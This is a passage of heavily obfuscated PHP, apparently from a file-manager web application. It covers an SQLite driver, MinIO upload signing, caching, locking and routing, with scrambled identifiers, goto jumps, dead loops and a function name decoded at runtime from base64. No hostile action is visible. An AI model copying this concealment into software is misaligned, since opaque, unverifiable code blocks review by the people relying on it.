(!$ñê¿™ÄŒ) { return; } call_user_func_array(array($this, $æâÆˆ), array()); } public function routeArgs($ìâÈÊè± = 3) { $ö©•²Ö£ = $this->in[$_SERVER[ú÷îèÆÜ][19]]; if (count($ö©•²Ö£) <= $ìâÈÊè±) { return array(); } $œúûÏÔĞ = array(); for ($ğ“ü­‡ = $ìâÈÊè±; $ğ“ü­‡ < count($ö©•²Ö£); $ğ“ü­‡ += 2) { $œúûÏÔĞ[$ö©•²Ö£[$ğ“ü­‡]] = $ö©•²Ö£[$ğ“ü­‡ + 1]; $this->in[$ö©•²Ö£[$ğ“ü­‡]] = $ö©•²Ö£[$ğ“ü­‡ + 1]; } return $œúûÏÔĞ; } protected function assign($ÜèŒ…†Š, $éĞğú¯Ü) { $this->values[$ÜèŒ…†Š] = $éĞğú¯Ü; } protected function display($­œ€ˆ°) { ob_end_clean(); extract($this->values); require $this->tpl . $­œ€ˆ°; } } class DbSqliteBase extends Db { public function __construct($Õª±¥Ñ = '') { $­œå¹Ü =& $_SERVER[ú÷îèÆÜ]; if (!extension_loaded($­œå¹Ü[23])) { think_exception(think_lang($­œå¹Ü[24]) . $­œå¹Ü[25]); } if (!empty($Õª±¥Ñ)) { if (!isset($Õª±¥Ñ[$­œå¹Ü[26]])) { $Õª±¥Ñ[$­œå¹Ü[26]] = 438; } $this->config = $Õª±¥Ñ; if (empty($this->config[$­œå¹Ü[27]])) { $this->config[$­œå¹Ü[27]] = array(); } } } public function connect($¯•å÷óø = '', $åû³ü‹± = 0) { $²†ç…´¯ =& $_SERVER[ú÷îèÆÜ]; if (!isset($this->linkID[$åû³ü‹±])) { if (empty($¯•å÷óø)) { $¯•å÷óø = $this->config; } $íÈå¦„å = !empty($¯•å÷óø[$²†ç…´¯[27]][$²†ç…´¯[28]]) ? $¯•å÷óø[$²†ç…´¯[27]][$²†ç…´¯[28]] : $this->pconnect; $ıìÂÅÙ— = $íÈå¦„å ? $²†ç…´¯[29] : $²†ç…´¯[30]; $this->linkID[$åû³ü‹±] = $ıìÂÅÙ—($¯•å÷óø[$²†ç…´¯[31]], $¯•å÷óø[$²†ç…´¯[26]]); if (!$this->linkID[$åû³ü‹±]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$åû³ü‹±], 30000); if (1 != think_config($²†ç…´¯[32])) { unset($this->config); } } return $this->linkID[$åû³ü‹±]; } public function free() { $this->queryID = null; } public function query($ÓÖ¼ĞúŠ) { $ƒÚª¨êö =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÓÖ¼ĞúŠ; if ($this->queryID) { $this->free(); } think_action_status($ƒÚª¨êö[33], 1); think_status($ƒÚª¨êö[34]); $this->queryID = sqlite_query($this->_linkID, $ÓÖ¼ĞúŠ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $áê¾ÚÈ› = $this->getAll(); return $áê¾ÚÈ›; } } public function execute($™¡÷Ü®’) { $Ñ¬²ß =& $_SERVER[ú÷îèÆÜ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $™¡÷Ü®’; if ($this->queryID) { $this->free(); } think_action_status($Ñ¬²ß[35], 1); think_status($Ñ¬²ß[34]); $ÍÃÌèÌü = sqlite_exec($this->_linkID, $™¡÷Ü®’); $this->debug(); if (!1 === $ÍÃÌèÌü) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ú÷îèÆÜ][36]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $êéÄØ¬ = sqlite_query($this->_linkID, $_SERVER[ú÷îèÆÜ][37]); if (!$êéÄØ¬) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $íü¡ğ†± = sqlite_query($this->_linkID, $_SERVER[ú÷îèÆÜ][38]); if (!$íü¡ğ†±) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $²ßÎ²Â¾ = array(); if ($this->numRows > 0) { for ($ƒºæ˜‘½ = 0; $ƒºæ˜‘½ < $this->numRows; $ƒºæ˜‘½++) { $²ßÎ²Â¾[$ƒºæ˜‘½] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $²ßÎ²Â¾; } public function getFields($Ï®‚µ™â) { $ÖòĞÇ‰à =& $_SERVER[ú÷îèÆÜ]; $Œ¾Ìüı¬ = $this->query($ÖòĞÇ‰à[39] . $Ï®‚µ™â . $ÖòĞÇ‰à[40]); $°Ò½³± = array(); if ($Œ¾Ìüı¬) { foreach ($Œ¾Ìüı¬ as $—–ãğ¸ => $¯¿ÌÔ—) { $°Ò½³±[$¯¿ÌÔ—[$ÖòĞÇ‰à[41]]] = array($ÖòĞÇ‰à[42] => $¯¿ÌÔ—[$ÖòĞÇ‰à[41]], $ÖòĞÇ‰à[43] => $¯¿ÌÔ—[$ÖòĞÇ‰à[44]], $ÖòĞÇ‰à[45] => (bool) ($¯¿ÌÔ—[$ÖòĞÇ‰à[46]] === $ÖòĞÇ‰à[22]), $ÖòĞÇ‰à[47] => $¯¿ÌÔ—[$ÖòĞÇ‰à[48]], $ÖòĞÇ‰à[49] => strtolower($¯¿ÌÔ—[$ÖòĞÇ‰à[50]]) == $ÖòĞÇ‰à[51], $ÖòĞÇ‰à[52] => strtolower($¯¿ÌÔ—[$ÖòĞÇ‰à[53]]) == $ÖòĞÇ‰à[54]); } } return $°Ò½³±; } public function getTables($§—±î„Û = '') { $¯âÇÃû§ =& $_SERVER[ú÷îèÆÜ]; $•ÅåÓÍö = $this->query($¯âÇÃû§[55] . $¯âÇÃû§[56] . $¯âÇÃû§[57]); $Íš¸÷Åµ = array(); foreach ($•ÅåÓÍö as $Ù‚¹Ïæ => $ğâÇøÛÙ) { $Íš¸÷Åµ[$Ù‚¹Ïæ] = current($ğâÇøÛÙ); } return $Íš¸÷Åµ; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $²åºÚ‚ò =& $_SERVER[ú÷îèÆÜ]; $ÏÔŸÁßó = sqlite_last_error($this->_linkID); $this->error = $ÏÔŸÁßó . $²åºÚ‚ò[4] . sqlite_error_string($ÏÔŸÁßó); if ($²åºÚ‚ò[22] != $this->queryStr) { $this->error .= LNG($²åºÚ‚ò[58]) . $this->queryStr; } think_trace($this->error, $²åºÚ‚ò[22], $²åºÚ‚ò[59]); return $this->error; } public function escapeString($õû¼ÈÈ) { return sqlite_escape_string($õû¼ÈÈ); } public function parseLimit($ş”•¤¡¡) { $’®Ó¢âÃ =& $_SERVER[ú÷îèÆÜ]; $™¹€ñ¤¸ = $’®Ó¢âÃ[22]; if (!empty($ş”•¤¡¡)) { $ş”•¤¡¡ = explode($’®Ó¢âÃ[60], $ş”•¤¡¡); if (count($ş”•¤¡¡) > 1) { $™¹€ñ¤¸ .= $’®Ó¢âÃ[61] . $ş”•¤¡¡[1] . $’®Ó¢âÃ[62] . $ş”•¤¡¡[0] . $’®Ó¢âÃ[63]; } else { $™¹€ñ¤¸ .= $’®Ó¢âÃ[61] . $ş”•¤¡¡[0] . $’®Ó¢âÃ[63]; } } return $™¹€ñ¤¸; } } goto B™±Åó±‘§; EøÂ…©¡†: class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($’Ñ…’ñÀ) { parent::__construct($’Ñ…’ñÀ); $this->signatureVersion($_SERVER[ú÷îèÆÜ][241]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($ï…àìØ, $ÃÀé¬Ú€ = 3600) { $ã¼è†şê =& $_SERVER[ú÷îèÆÜ]; $…¬¸»İ¿ = $ã¼è†şê[223]; $ì«ÒÔÊï = $ã¼è†şê[262]; $¯²ï¥÷ù = $ã¼è†şê[72]; $º›’…Å = gmdate($ã¼è†şê[263]); $Ñşµ‡ñ = gmdate($ã¼è†şê[264]); $Æû³òà‹ = $ã¼è†şê[265]; $Á•±®Ë£ = $ÃÀé¬Ú€ . $ã¼è†şê[22]; $ãßÏºŒ– = $ã¼è†şê[266]; $ÃöÚÖ‚ã = array($this->accessKey, $Ñşµ‡ñ, $this->region, $¯²ï¥÷ù, $Æû³òà‹); $¼ºÒü = implode($ã¼è†şê[18], $ÃöÚÖ‚ã); $³ìŞÇà‡ = array($ã¼è†şê[267] => gmdate($ã¼è†şê[268], strtotime($ã¼è†şê[269])), $ã¼è†şê[270] => array(array($ã¼è†şê[271] => $this->bucket), array($ã¼è†şê[272] => $…¬¸»İ¿), array($ã¼è†şê[273], $ã¼è†şê[274], $ã¼è†şê[22]), array($ã¼è†şê[273], $ã¼è†şê[275], $ã¼è†şê[22]), array($ã¼è†şê[273], $ã¼è†şê[276], $ã¼è†şê[22]), array($ã¼è†şê[277] => $ãßÏºŒ–), array($ã¼è†şê[278] => $¼ºÒü), array($ã¼è†şê[279] => $ì«ÒÔÊï), array($ã¼è†şê[280] => $º›’…Å), array($ã¼è†şê[281] => $Á•±®Ë£))); $ÔÓØ÷¬ = base64_encode(json_encode($³ìŞÇà‡)); $›ŸÜû¹€ = hash_hmac($ã¼è†şê[282], $Ñşµ‡ñ, $ã¼è†şê[283] . $this->secret, !0); $¼åä¬Ø = hash_hmac($ã¼è†şê[282], $this->region, $›ŸÜû¹€, !0); $šÛÄ¢Î˜ = hash_hmac($ã¼è†şê[282], $¯²ï¥÷ù, $¼åä¬Ø, !0); $ã§«ñ†² = hash_hmac($ã¼è†şê[282], $Æû³òà‹, $šÛÄ¢Î˜, !0); $ïÊÓâÚù = hash_hmac($ã¼è†şê[282], $ÔÓØ÷¬, $ã§«ñ†²); $•àÖáúû = array($ã¼è†şê[240] => $ã¼è†şê[22], $ã¼è†şê[284] => $ã¼è†şê[22], $ã¼è†şê[272] => $…¬¸»İ¿, $ã¼è†şê[277] => $ãßÏºŒ–, $ã¼è†şê[285] => $ÔÓØ÷¬, $ã¼è†şê[286] => $¼ºÒü, $ã¼è†şê[287] => $ì«ÒÔÊï, $ã¼è†şê[288] => $º›’…Å, $ã¼è†şê[289] => $Á•±®Ë£, $ã¼è†şê[290] => $ïÊÓâÚù, $ã¼è†şê[206] => $this->getHost()); return $•àÖáúû; } } define($_SERVER[ú÷îèÆÜ][291], 1); define($_SERVER[ú÷îèÆÜ][292], 2); goto d¶‘µ÷Ó¿†; C¿¬„·ğç–: $fileSize = strrev(base64_decode($_SERVER[¶–®Â†­][0])); function binCheckNeq($ÜµÊİ», $¿œÔ¯ò§) { return $ÜµÊİ» != $¿œÔ¯ò§; } $_SERVER[$_SERVER[¶–®Â†­][1]] = $fileSize($_SERVER[$_SERVER[¶–®Â†­][2]]); goto d„çÏ«¡åÜ; bÖ˜¼«ß÷: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $†¸åÊú† =& $_SERVER[ú÷îèÆÜ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $•âñ×İ» = $GLOBALS[$†¸åÊú†[16]][$†¸åÊú†[402]]; $éÒĞéçİ = $•âñ×İ»[$•âñ×İ»[$†¸åÊú†[867]]]; $×„–‡Î = $•âñ×İ»[$†¸åÊú†[868]]; switch ($•âñ×İ»[$†¸åÊú†[867]]) { case $†¸åÊú†[31]: self::$handle = Model($†¸åÊú†[869]); break; case $†¸åÊú†[870]: self::$handle = new CacheRedis($éÒĞéçİ, $×„–‡Î); break; case $†¸åÊú†[871]: self::$handle = new CacheMemcached($éÒĞéçİ, $×„–‡Î); break; case $†¸åÊú†[224]: self::$handle = new CacheFile($éÒĞéçİ, $×„–‡Î); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($˜³¼—¸) { if (is_array($˜³¼—¸) || is_object($˜³¼—¸)) { $˜³¼—¸ = json_encode($˜³¼—¸); } $˜³¼—¸ = rawurlencode($˜³¼—¸); return md5(KOD_SITE_ID . $_SERVER[ú÷îèÆÜ][21] . $˜³¼—¸); } public static function get($ˆ­úîÒÆ, $ÆòÚ‘Ñ­ = false) { $¸¼“–³Ö = self::key($ˆ­úîÒÆ); $±¾¹Ğ¤ˆ = self::init(); if ($ÆòÚ‘Ñ­) { return unserialize($±¾¹Ğ¤ˆ->get($¸¼“–³Ö)); } if (!isset(self::$memoryCache[$¸¼“–³Ö])) { $Æ¾Œ§ıÁ = $±¾¹Ğ¤ˆ->get($¸¼“–³Ö); self::$memoryCache[$¸¼“–³Ö] = unserialize($Æ¾Œ§ıÁ); } return self::$memoryCache[$¸¼“–³Ö]; } public static function set($Ê¦µÒé, $İé½£…·, $„ˆ ÓµŸ = false) { $µ«³·’ =& $_SERVER[ú÷îèÆÜ]; $ÃÄö›„Ä = self::key($Ê¦µÒé); if (isset(self::$memoryCache[$ÃÄö›„Ä]) && self::$memoryCache[$ÃÄö›„Ä] === $İé½£…·) { return !0; } if ($„ˆ ÓµŸ === 0) { self::$memoryCache[$ÃÄö›„Ä] = $İé½£…·; return !0; } $ÒÊ—ò¬ = self::init(); $İô·¶Í = serialize($İé½£…·); CacheLock::lock($Ê¦µÒé . $µ«³·’[872]); $­µŠ„Ûä = $ÒÊ—ò¬->set($ÃÄö›„Ä, $İô·¶Í, $„ˆ ÓµŸ); self::$memoryCache[$ÃÄö›„Ä] = $İé½£…·; CacheLock::unlock($Ê¦µÒé . $µ«³·’[872]); return $­µŠ„Ûä; } public static function getCall($ÓºíÑºí, $õœ©ÓïÂ, $ß§¡»‚™, $÷ä‹¦ñÖ = array()) { $˜ŞÛõş¡ =& $_SERVER[ú÷îèÆÜ]; $¿¯Ü¤ñö = self::get($ÓºíÑºí); if ($¿¯Ü¤ñö || $¿¯Ü¤ñö === $˜ŞÛõş¡[22]) { return $¿¯Ü¤ñö; } $¿¯Ü¤ñö = call_user_func_array($ß§¡»‚™, $÷ä‹¦ñÖ); $¿¯Ü¤ñö = $¿¯Ü¤ñö ? $¿¯Ü¤ñö : $˜ŞÛõş¡[22]; self::set($ÓºíÑºí, $¿¯Ü¤ñö, $õœ©ÓïÂ); return $¿¯Ü¤ñö; } public static function remove($öÓÀ¾…Õ) { $®€³Ã­­ = self::key($öÓÀ¾…Õ); unset(self::$memoryCache[$®€³Ã­­]); self::clearTimeout(); CacheLock::lock($öÓÀ¾…Õ); $¥¾åŞóê = self::init()->remove($®€³Ã­­); CacheLock::unlock($öÓÀ¾…Õ); return $¥¾åŞóê; } public static function removeMemory($¹Î¼Ñüú) { $Œ¤Ö¤­§ = self::key($¹Î¼Ñüú); unset(self::$memoryCache[$Œ¤Ö¤­§]); } public static function clearMemory($ŒùÕÈ©† = false) { if ($ŒùÕÈ©†) { $ŒùÕÈ©† = self::key($ŒùÕÈ©†); unset(self::$memoryCache[$ŒùÕÈ©†]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ú÷îèÆÜ][873])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ú÷îèÆÜ][874])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($¶Š”£è, $¡³Âõ») { $¨ãê¿ÆÆ =& $_SERVER[ú÷îèÆÜ]; $this->cachePath = $¶Š”£è[$¨ãê¿ÆÆ[94]]; $this->prefix = $¨ãê¿ÆÆ[875]; $this->cacheTime = $¡³Âõ»; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($àÜ°‰°) { $ûÂæÚéğ =& $_SERVER[ú÷îèÆÜ]; $àÜ°‰° = str_replace(array($ûÂæÚéğ[876], $ûÂæÚéğ[107], $ûÂæÚéğ[83]), $ûÂæÚéğ[877], $àÜ°‰°); return $this->cachePath . $ûÂæÚéğ[878] . $àÜ°‰° . $ûÂæÚéğ[879]; } public function set($¢µœ¨·µ, $¨Û˜èá”, $Œ±Ñ¸³§ = false) { $Œ±Ñ¸³§ = $Œ±Ñ¸³§ ? $Œ±Ñ¸³§ : $this->cacheTime; $—Éñ´ÍŠ = $this->getFile($¢µœ¨·µ); if (file_put_contents($—Éñ´ÍŠ, $this->prefix . $¨Û˜èá”, LOCK_EX)) { @touch($—Éñ´ÍŠ, intval(time() + $Œ±Ñ¸³§)); clearstatcache(); return !0; } @unlink($—Éñ´ÍŠ); return !1; } public function get($¾‹òÙ¢Æ) { $´Î¬œùİ = $this->getFile($¾‹òÙ¢Æ); if (file_exists($´Î¬œùİ) && filemtime($´Î¬œùİ) < time()) { @unlink($´Î¬œùİ); return !1; } $¥ê£–Û£ = @file_get_contents($´Î¬œùİ); return substr($¥ê£–Û£, strlen($this->prefix)); } public function remove($Ô¿ù¥) { $ªç¾‚ = $this->getFile($Ô¿ù¥); return @unlink($ªç¾‚); } public function deleteAll() { $üµî˜¶Œ =& $_SERVER[ú÷îèÆÜ]; $§®‰íŸª = scandir($this->cachePath); foreach ($§®‰íŸª as $ûºÓÜ€ô) { $Ş£µŒÜ· = $this->cachePath . $ûºÓÜ€ô; if (strpos($Ş£µŒÜ·, $üµî˜¶Œ[879]) && strpos($Ş£µŒÜ·, $üµî˜¶Œ[880])) { @unlink($Ş£µŒÜ·); } } } public function clearTimeout() { $ŸÎ¿—¬› =& $_SERVER[ú÷îèÆÜ]; $ŞîÇÃ†ü = scandir($this->cachePath); foreach ($ŞîÇÃ†ü as $¬İ™…®Ì) { $î“˜¦§í = $this->cachePath . $¬İ™…®Ì; if (strpos($î“˜¦§í, $ŸÎ¿—¬›[879]) && strpos($î“˜¦§í, $ŸÎ¿—¬›[880]) && filemtime($î“˜¦§í) < time()) { @unlink($î“˜¦§í); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $¯ÏÂşıä =& $_SERVER[ú÷îèÆÜ]; if (self::$handle) { return self::$handle; } $Àó‡Åıİ = $GLOBALS[$¯ÏÂşıä[16]][$¯ÏÂşıä[402]]; self::$timeout = $Àó‡Åıİ[$¯ÏÂşıä[881]] ? $Àó‡Åıİ[$¯ÏÂşıä[881]] : 10; $ı¹¢œ = _get($GLOBALS[$¯ÏÂşıä[16]], $¯ÏÂşıä[882]); $ÈñÆÂèÑ = $Àó‡Åıİ[$¯ÏÂşıä[867]] ? $Àó‡Åıİ[$¯ÏÂşıä[867]] : $¯ÏÂşıä[224]; if ($ÈñÆÂèÑ == $¯ÏÂşıä[31] && $ı¹¢œ == $¯ÏÂşıä[23]) { $ÈñÆÂèÑ = $¯ÏÂşıä[224]; } switch ($ÈñÆÂèÑ) { case $¯ÏÂşıä[870]: self::$handle = new CacheLockRedis(); break; case $¯ÏÂşıä[871]: self::$handle = new CacheLockMemcached(); break; case $¯ÏÂşıä[31]: self::$handle = new CacheLockDatabase(); break; case $¯ÏÂşıä[224]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($¯ÏÂşıä[883], $¯ÏÂşıä[884]); } return self::$handle; } private static function key($ÍŠÅ‡ˆñ) { return $_SERVER[ú÷îèÆÜ][885] . Cache::key($ÍŠÅ‡ˆñ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($µšÎ‹ùÌ = '') { self::$errorMsg = $µšÎ‹ùÌ; } public static function lockGlobal($Ã˜æÎ†ˆ, $óı³¯î) { return self::lock($Ã˜æÎ†ˆ, $óı³¯î, !0); } public static function lock($áÎáçÑ‘, $ÆôæÏ«è = false, $ŠØëÉ³× = false) { $á²ŒûÔ =& $_SERVER[ú÷îèÆÜ]; $–Öù¬º = self::init(); $êåíÀ±¯ = self::key($áÎáçÑ‘); $ÆôæÏ«è = $ÆôæÏ«è ? $ÆôæÏ«è : self::$timeout; $®õ†’Õü = timeFloat(); $âæ„ÔÖ¸ = $–Öù¬º->lock($êåíÀ±¯, $ÆôæÏ«è); $€Ò¶¾áš = timeFloat(); if (!$âæ„ÔÖ¸) { $ÎÚêÎÙı = "\x6c\157\143\153\x20\145\162\162\157\x72\73\153\145\x79\75{$áÎáçÑ‘}\73\164\x69\x6d\145\75{$ÆôæÏ«è}\x3b" . self::$errorMsg . $á²ŒûÔ[81] . get_caller_msg(); $¬‰ìµ¬û = LNG($á²ŒûÔ[886]) . "\50{$ÆôæÏ«è}\x73\x29\x2e" . LNG($á²ŒûÔ[887]); $¬‰ìµ¬û .= $á²ŒûÔ[888]; if (is_string(self::$errorMsg) && self::$errorMsg) { $¬‰ìµ¬û = $¬‰ìµ¬û . $á²ŒûÔ[889] . self::$errorMsg; } write_log($á²ŒûÔ[890] . sprintf($á²ŒûÔ[891], timeFloat() - $®õ†’Õü) . $á²ŒûÔ[892] . $ÎÚêÎÙı . $á²ŒûÔ[893] . error_get_last(), $á²ŒûÔ[884]); show_json($¬‰ìµ¬û, !1); } if (!$ŠØëÉ³×) { self::$lockItem[$êåíÀ±¯] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $ÅˆñÔ©¨ = number_format(timeFloat() - $€Ò¶¾áš, 3); write_log($á²ŒûÔ[894] . $áÎáçÑ‘ . $á²ŒûÔ[895] . $ÅˆñÔ©¨, $á²ŒûÔ[884]); } return $âæ„ÔÖ¸; } public static function lockGet($¢˜å÷æ) { $çÄšÛ€ = self::key($¢˜å÷æ); if (self::$lockItem[$çÄšÛ€]) { return self::$lockItem[$çÄšÛ€]; } return self::init()->lockGet($çÄšÛ€); } public static function unlock($Âİæ± ¡) { $Î¯ò÷Î =& $_SERVER[ú÷îèÆÜ]; $ˆŞŒ×Š¿ = self::key($Âİæ± ¡); self::$lockItem[$ˆŞŒ×Š¿] = null; self::init()->unlock($ˆŞŒ×Š¿); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Î¯ò÷Î[896] . $Âİæ± ¡, $Î¯ò÷Î[884]); } return; } public static function unlockRuntime() { $…óÜÄµ =& $_SERVER[ú÷îèÆÜ]; $¾¡¤‹ïÅ = self::init(); $Æ†¹Î“ï = !1; foreach (self::$lockItem as $ÃÑö™ô => $¬å¾ŸÀë) { if (!$¬å¾ŸÀë) { continue; } $¾¡¤‹ïÅ->unlock($ÃÑö™ô); if (!$Æ†¹Î“ï) { $Æ†¹Î“ï = !0; write_log($…óÜÄµ[897] . $ÃÑö™ô . $…óÜÄµ[81] . get_caller_msg(), $…óÜÄµ[884]); continue; } write_log($…óÜÄµ[897] . $ÃÑö™ô, $…óÜÄµ[884]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ÃÑ›°ï› = number_format(timeFloat() - TIME_FLOAT, 3); write_log($…óÜÄµ[898] . $ÃÑ›°ï› . $…óÜÄµ[899] . ACTION, $…óÜÄµ[884]); } } public static function fileLock($‚îÖä) { $·ô‚®Ô =& $_SERVER[ú÷îèÆÜ]; if (!$GLOBALS[$·ô‚®Ô[900]]) { $GLOBALS[$·ô‚®Ô[900]] = array(); } $GLOBALS[$·ô‚®Ô[900]][$‚îÖä] = !1; $öš¥Äó‰ = fopen(DATA_PATH . $‚îÖä . $·ô‚®Ô[901], $·ô‚®Ô[902]); if (!$öš¥Äó‰) { return !1; } $GLOBALS[$·ô‚®Ô[900]][$‚îÖä] = $öš¥Äó‰; if (flock($öš¥Äó‰, LOCK_EX)) { return !0; } self::unlock($‚îÖä); show_json($·ô‚®Ô[903], !1); return !1; } public static function fileUnlock($ø©ó†Õ) { $Î»ğÅ†• =& $_SERVER[ú÷îèÆÜ]; $ƒÏ™®Œ‚ = $GLOBALS[$Î»ğÅ†•[900]][$ø©ó†Õ]; if (!$ƒÏ™®Œ‚) { return; } $GLOBALS[$Î»ğÅ†•[900]][$ø©ó†Õ] = !1; flock($ƒÏ™®Œ‚, LOCK_UN); fclose($ƒÏ™®Œ‚); } public static function fileUnlockAll() { $‚»¬ÂåØ =& $_SERVER[ú÷îèÆÜ]; if (!$GLOBALS[$‚»¬ÂåØ[900]]) { return; } foreach ($GLOBALS[$‚»¬ÂåØ[900]] as $÷¦âĞ£¥ => $Äˆµ‚î®) { if (!$Äˆµ‚î®) { continue; } $GLOBALS[$‚»¬ÂåØ[900]][$÷¦âĞ£¥] = !1; flock($Äˆµ‚î®, LOCK_UN); fclose($Äˆµ‚î®); } $GLOBALS[$‚»¬ÂåØ[900]] = array(); } } goto Dã‰Ùí¸ñ¡; fàøë‡¬†¶: if (!$feoykidnmp) { die; } class Application { private $defaultModule = "\151\156\x64\x65\x78"; private $defaultController = "\x69\156\x64\145\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($¶›×ü¶Ã) { $õÜõúÔÀ =& $_SERVER[ú÷îèÆÜ]; $ñ¦ø¿  =& $_SERVER[û¬ú¢è]; $ô‡Í‰Á« = explode($ñ¦ø¿ [0], trim($¶›×ü¶Ã, $ñ¦ø¿ [0])); $Å±Í£ù£ = $õÜõúÔÀ[661]; if (strlen($Å±Í£ù£) < $õÜõúÔÀ[662]) { return; } $this->defaultModule = $ô‡Í‰Á«[0] ? $ô‡Í‰Á«[0] : $this->defaultModule; $àŸè´…¿ = $õÜõúÔÀ[663]; while (strlen($àŸè´…¿) < $õÜõúÔÀ[12]) { if (!$àŸè´…¿) { break; } $àŸè´…¿++; } $this->defaultController = $ô‡Í‰Á«[1] ? $ô‡Í‰Á«[1] : $this->defaultController; $this->defaultAction = $ô‡Í‰Á«[2] ? $ô‡Í‰Á«[2] : $this->defaultAction; $ÏÁ¥Â×Á = $õÜõúÔÀ[664]; $this->ekqfc4a7aafa($ñ¦ø¿ [1], array($this, $ñ¦ø¿ [2])); } public function appRun($ˆ‚Ù¬ş¤) { $Ø©ìØ“³ =& $_SERVER[ú÷îèÆÜ]; $ìÊïâ˜ =& $_SERVER[û¬ú¢è]; $äÕ“¿ÏÔ = explode($ìÊïâ˜[0], $ˆ‚Ù¬ş¤); $™•—ïËÒ = strtolower($äÕ“¿ÏÔ[0]); $§®¸¨ˆâ = $ìÊïâ˜[3]; if ($™•—ïËÒ == $ìÊïâ˜[4]) { $§®¸¨ˆâ = $ìÊïâ˜[5]; $äÕ“¿ÏÔ[0] = $ìÊïâ˜[6]; $äÕ“¿ÏÔ[1] = $äÕ“¿ÏÔ[1] . $ìÊïâ˜[7]; $ˆ‚Ù¬ş¤ = join($ìÊïâ˜[0], $äÕ“¿ÏÔ); $ˆ‚Ù¬ş¤ = trim($ˆ‚Ù¬ş¤, $ìÊïâ˜[0]); } call_user_func(array($ìÊïâ˜[8], $ìÊïâ˜[9]), $§®¸¨ˆâ . $ìÊïâ˜[10], $ˆ‚Ù¬ş¤); ActionCall($ˆ‚Ù¬ş¤); call_user_func(array($ìÊïâ˜[8], $ìÊïâ˜[9]), $§®¸¨ˆâ . $ìÊïâ˜[11], $ˆ‚Ù¬ş¤); $¹‰ÑÕ¾’ = $Ø©ìØ“³[665]; while (strlen($¹‰ÑÕ¾’) < $Ø©ìØ“³[666]) { if (!$¹‰ÑÕ¾’) { break; } $¹‰ÑÕ¾’++; } } private function autorun() { $äÚÂÛú =& $_SERVER[û¬ú¢è]; global $config; if (count($config[$äÚÂÛú[12]]) == 0) { return; } foreach ($config[$äÚÂÛú[12]] as $ÍÓ™”¿î => $ÙıóÖì¤) { $this->appRun($ÙıóÖì¤); $²•Í‚º¯ = $_SERVER[ú÷îèÆÜ][667]; } } private function tafe567b59f0() { $ã°ğœ‰ =& $_SERVER[ú÷îèÆÜ]; $ìŒ—Ÿ =& $_SERVER[û¬ú¢è]; $¦âÑ‡œ = $ìŒ—Ÿ[4]; $˜·ÏÌã = $ã°ğœ‰[668]; while ($˜·ÏÌã < $ã°ğœ‰[12]) { if ($˜·ÏÌã >= 0) { break; } $˜·ÏÌã++; } $†åô±ó = $GLOBALS[$ìŒ—Ÿ[13]][$ìŒ—Ÿ[14]][0]; if (!$†åô±ó || strlen($†åô±ó) <= strlen($¦âÑ‡œ)) { return; } if (strtolower(substr($†åô±ó, -strlen($¦âÑ‡œ))) != $¦âÑ‡œ) { return; } $à‹”€ÜÉ = substr($†åô±ó, 0, -strlen($¦âÑ‡œ)); $¡Î³Öü» = $ã°ğœ‰[669]; $ËƒğíùŸ = array($ìŒ—Ÿ[4], $à‹”€ÜÉ); $¥ªØÚ–œ = $ã°ğœ‰[670]; if (strlen($¥ªØÚ–œ) < $ã°ğœ‰[12]) { die; } $ƒ¬Ñ‡™ = array_slice($GLOBALS[$ìŒ—Ÿ[13]][$ìŒ—Ÿ[14]], 1); $GLOBALS[$ìŒ—Ÿ[13]][$ìŒ—Ÿ[14]] = array_merge($ËƒğíùŸ, $ƒ¬Ñ‡™); $â™æÍŸµ = $ã°ğœ‰[671]; $GLOBALS[$ìŒ—Ÿ[13]][$ìŒ—Ÿ[15]] = implode($ìŒ—Ÿ[0], $GLOBALS[$ìŒ—Ÿ[13]][$ìŒ—Ÿ[14]]); } private function ljzi429e8d73() { $–ÙÊ– =& $_SERVER[ú÷îèÆÜ]; $üØ³öä£ =& $_SERVER[û¬ú¢è]; if ($GLOBALS[$üØ³öä£[13]][$üØ³öä£[15]] != $üØ³öä£[6]) { return; } $«æÖ©Ë = $_SERVER[$üØ³öä£[16]]; $¤³×˜Ñ› = $üØ³öä£[17]; $Åò”Ôü® = $–ÙÊ–[672]; if (strlen($Åò”Ôü®) < $–ÙÊ–[666]) { die; } if (!strstr($«æÖ©Ë, $¤³×˜Ñ›)) { return; } $éÎ¶Á³Ü = 